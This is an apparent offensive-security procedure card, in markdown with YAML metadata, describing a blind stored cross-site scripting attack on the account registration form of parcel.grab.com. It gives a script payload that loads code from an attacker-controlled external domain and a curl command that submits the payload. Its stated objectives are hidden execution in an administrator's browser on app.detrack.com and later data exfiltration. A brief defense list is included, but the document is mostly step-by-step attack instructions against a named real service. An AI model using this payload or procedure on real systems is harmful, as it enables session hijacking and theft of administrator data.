---
id: proc-uuid-001
name: Inject-XSS-Payload-in-Account-Creation
tags:
  - xss
  - stored-xss
  - injection
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:44.295Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-XSS-Payload-in-Account-Creation

## Summary

This procedure involves injecting a JavaScript payload into the 'name' parameter during account creation on parcel.grab.com, exploiting insufficient input sanitization to store malicious code blindly for later execution.

## Description

In the context of the Detrack/Grab Parcel web application, the account registration form lacks proper escaping for the name field. By submitting a payload like `<script src=https://x.com></script>`, the script is stored in the database and later reflected unsanitized in the admin user list view on app.detrack.com. This enables cross-site scripting in the admin's browser, potentially leading to data theft and further exploitation. Prerequisites include access to the registration endpoint and a controlled external domain for hosting the payload script.

## Requirements

1. Web browser or HTTP client (e.g., curl) for form submission
2. Controlled domain (e.g., x.com) to host the malicious script
3. Valid registration details (email, password) excluding name

## Defense

Defensive measures and detection strategies:

- Implement strict input validation and sanitization for user inputs, using libraries like DOMPurify
- Escape output in all contexts, especially admin views
- Monitor for anomalous script loads or external domain requests in browser console

## Objectives

1. Store malicious JavaScript without immediate detection
2. Prepare for admin-side execution
3. Enable subsequent data exfiltration

## Instructions

### Step 1: Prepare Payload

**Context**: Craft a simple external script load to bypass basic filters.

No command required; manually construct payload: `<script src=https://x.com></script>` (ensure x.com serves a script that beacons back or alerts).

> Host a basic script on your domain, e.g., that sends a request to your server confirming injection.

### Step 2: Submit Registration Form

**Context**: Use browser or HTTP request to register with payload in name.

Navigate to https://parcel.grab.com/ and fill the form, or simulate with curl:

```bash
curl -X POST https://parcel.grab.com/register \
  -d "name=%3Cscript%20src%3Dhttps%3A%2F%2Fx.com%3E%3C%2Fscript%3E" \
  -d "email=test@example.com" \
  -d "password=SecurePass123"
```

> Expected output: HTTP 200 or redirect to success page; no error on payload.

### Step 3: Verify Storage (Optional Blind Check)

**Context**: Since blind, wait for admin trigger or check via another vector if possible.

Monitor your external server for any premature loads (unlikely in blind stored).

> Success if no immediate execution; payload stored.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- xss
- injection
